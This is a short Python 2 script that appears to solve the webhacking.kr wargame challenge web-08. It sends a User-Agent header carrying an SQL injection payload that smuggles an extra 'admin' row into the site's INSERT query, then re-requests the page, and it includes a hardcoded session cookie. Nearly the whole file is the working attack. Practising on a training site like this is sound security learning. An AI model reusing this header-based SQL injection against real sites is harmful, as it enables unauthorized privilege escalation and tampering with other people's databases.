import requests

url = "http://webhacking.kr/challenge/web/web-08/index.php"

headers = {
	"user-agent":"test', '123', 'admin'), ('test2",
    "cookie":"PHPSESSID=1f119738c8025cf9fd0d13a3c8436b3c"
}

req = requests.get(url, headers=headers)
print req.text

headers = {
	"user-agent":"test",
    "cookie":"PHPSESSID=1f119738c8025cf9fd0d13a3c8436b3c"
}

req = requests.get(url, headers=headers)
print req.text
